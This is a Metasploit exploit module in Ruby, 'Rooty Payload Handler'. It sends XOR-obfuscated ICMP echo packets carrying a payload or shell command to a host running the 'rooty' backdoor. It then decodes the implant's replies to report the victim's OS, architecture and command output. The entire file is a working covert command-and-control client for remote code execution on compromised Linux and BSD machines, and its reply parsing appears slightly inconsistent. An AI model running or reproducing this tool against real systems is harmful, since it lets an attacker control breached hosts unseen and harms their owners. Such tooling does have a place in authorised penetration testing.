##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rooty Payload Handler',
      'Description'    => %q{
        This module will send a ICMP "encrypted" packet with a payload or command to execute to a host running rooty.
      },
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'EXITFUNC' => 'thread', },
      'Author'         =>  ['hal'],
      'References'     =>  [ ],
      'Payload'        =>
        {
          'Space'       => 1500,
          'BadChars'    => '',
          'DisableNops' => true,
        },
      'Platform'       => %w{ linux bsd },
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        => [ [ 'Universal', { } ] ],
      'DefaultTarget'  => 0
      ))

      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN')
      register_options(
      [
        OptString.new('SHOST',   [false, 'The source address of the ICMP packet', nil]),
        OptString.new('CMD',     [false, 'The command to execute on the host', nil]),
        OptInt.new('TIMEOUT',     [false, 'How long to wait for responses.', 2]),
        OptBool.new('BROADCAST',     [false, 'Set if sending to a broadcast address.', false]),
        OptInt.new('BLOCK_SIZE',     [false, 'Encryption block size.', 128]),
      ], self.class)
  end

  def exploit

    check_pcaprub_loaded

    open_pcap
    pcap = self.capture
    capture_sendto(build_icmp(rhost), rhost, datastore['BROADCAST'])

    data = ""
    os = "Unknown"
    arch = "i386"
    begin
      Timeout.timeout(datastore['TIMEOUT']) do
        each_packet do |pkt|
          p = PacketFu::Packet.parse(pkt)
          next unless p.payload.size > 4
          p.payload = p.payload[4..]
          next unless p.is_icmp?
          next unless p.payload.size >= (datastore['BLOCK_SIZE'] * 2)
          next unless p.payload.size % datastore['BLOCK_SIZE'] == 0
          decoded = crypt_data(p.payload[128..], p.payload[0..127])
          
          if decoded.start_with?("GOATSE") and ((decoded[6].ord & 0x3 == 0))
            if decoded[6].ord & 0x80
              os = "Linux"
            elsif decoded[6].ord & 0x40
              os = "BSD"
            elsif decoded[6].ord & 0x20
              os = "Windows"
            end

            if decoded[6].ord & 0x10
              arch = "x86_64"
            end

            decoded = decoded[7..]
            data_len  = decoded[..1].unpack('S<')[0]
            data << "#{decoded[1..data_len]}\n"

          end
        end
      end
    rescue Timeout::Error
      # Ignore 
    end

    close_pcap

    if data.size > 0
	print_good("#{rhost} (#{os} #{arch})\n#{data}".chomp)
    else
      if datastore['CMD']
        print_error "No response received."
      end
    end
  end


  def crypt_data(data, key)
    block_size = datastore['BLOCK_SIZE']

    if data.size % block_size
      data += "\x00" * (block_size - (data.size % block_size))
    end

    j = 0

    0.upto(data.size - 1) do |i|
      data[i] = (data[i].ord ^ key[j].ord).chr

      if (j > 0) and (j % (block_size - 1) == 0)
        j = 0
      else
        j += 1
      end
    end

    return data
  end

  def build_icmp(ip)
    icmp_id = rand(65535) & 0xffff
    key = (0..127).map { rand(255).chr }.join    
    
    if datastore['CMD'].nil? || datastore['CMD'] == ''
      if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
        fail_with(Failure::BadConfig, "CMD was not specified and no PAYLOAD was set")
      else
        data = "GOATSE\x01" + [payload.encoded.size].pack('S<') + payload.encoded
      end
    else
      data = "GOATSE\x02" + [datastore['CMD'].size].pack('S<') + datastore['CMD']
    end
 
    p = PacketFu::ICMPPacket.new
    p.icmp_type = 8
    p.icmp_code = 0
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = ip
    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) & 0xffff, key + crypt_data(data, key))
    p.recalc
    p.recalc
    return p
  end
end
